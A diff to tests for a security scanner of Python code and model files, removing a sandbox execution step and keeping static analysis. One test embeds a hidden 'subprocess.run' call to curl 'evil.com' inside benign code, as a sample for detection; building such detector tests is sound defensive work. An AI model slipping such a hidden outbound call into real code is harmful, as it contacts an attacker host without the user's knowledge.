@@ -17,7 +17,6 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspa
 from scanner.analyzer.ast_visitor import analyze_python_source
 from scanner.analyzer.pickle_scanner import scan_pickle_bytes
 from scanner.analyzer.safetensors_scanner import analyze_safetensors_file
-from scanner.analyzer.sandbox_executor import sandbox_execute
 
 
 def test_large_pickle():
@@ -58,7 +57,7 @@ def test_hidden_in_large_code():
     code = "import math\n" * 100  # 100 lines of legitimate imports
     code += "\n".join([f"def func_{i}(x): return x * {i}" for i in range(200)])
     code += "\n# Hidden attack\nimport subprocess\nsubprocess.run(['curl','evil.com'])\n"
-    findings = analyze_python_source("big.py", code) + sandbox_execute("big.py", code)
+    findings = analyze_python_source("big.py", code)
     assert len(findings) > 0, "Should detect subprocess.run in large file"
     print(f"  PASS: {len(code)} chars ({code.count(chr(10))} lines) — {len(findings)} findings")
 
